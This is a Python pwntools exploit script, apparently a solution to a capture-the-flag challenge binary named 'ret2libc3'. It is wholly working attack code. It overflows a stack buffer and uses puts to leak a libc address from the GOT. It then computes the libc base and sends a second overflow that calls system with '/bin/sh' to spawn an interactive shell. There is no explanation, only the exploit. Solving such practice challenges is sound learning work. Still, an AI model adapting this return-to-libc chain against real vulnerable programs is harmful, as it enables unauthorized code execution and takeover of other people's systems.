from pwn import *
from pwnlib.util.packing import p32,u32

sh = process('binary/ret2libc3')
ret2libc3 = ELF('binary/ret2libc3')

puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']
payload = b'A' * 112 + p32( puts_plt) + p32(main) + p32(libc_start_main_got)
sh.sendlineafter(b'Can you find it !?', payload)

libc_start_main_addr = u32(sh.recv()[0:4])
libc = ret2libc3.libc
libc.address = libc_start_main_addr - libc.symbols['__libc_start_main']
system_addr = libc.symbols['system']
binsh_addr = list(libc.search(b'/bin/sh'))[-1]
payload = b'A' * 104 + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)
sh.sendline(payload)
sh.interactive()